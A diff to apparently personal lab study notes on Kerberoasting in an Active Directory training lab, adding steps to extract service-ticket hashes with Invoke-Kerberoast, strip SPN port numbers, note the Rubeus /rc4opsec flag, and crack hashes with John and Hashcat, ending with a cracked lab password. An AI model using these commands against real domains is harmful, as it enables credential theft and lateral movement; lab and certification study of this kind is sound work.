@@ -946,13 +946,28 @@ Invoke-Kerberoast -OutputFormat Hashcat | % { $_.Hash } | Out-File hashes.txt
 ```
 
 #### Cracking Phase
-```bash
-# Prepare hash (remove :port from SPN if present)
-# File format: $krb5tgs$23$*svcadmin$DOMAIN$SPNWithoutPort*
 
+**Step 1: Prepare Hash File (CRITICAL)**
+```
+If Rubeus output includes port numbers in SPN, must remove before cracking:
+
+BEFORE: $krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*
+AFTER:  $krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*
+
+Why: John/Hashcat won't recognize hash if port is included in SPN field. Edit hashes.txt to remove port numbers.
+
+Note on /rc4opsec flag:
+- Skips accounts with 'This account supports Kerberos AES 128/256 bit encryption' set
+- These are harder to crack and modern accounts typically have this enabled
+- Results in fewer but more crackable hashes
+```
+
+**Step 2: Crack Hash**
+```bash
+# Using John the Ripper
 john --wordlist=10k-worst-pass.txt hashes.txt
 
-# Hashcat
+# Using Hashcat
 hashcat -m 13100 hashes.txt wordlist.txt
 
 # Lab output: *ThisisBlasphemyThisisMadness!!
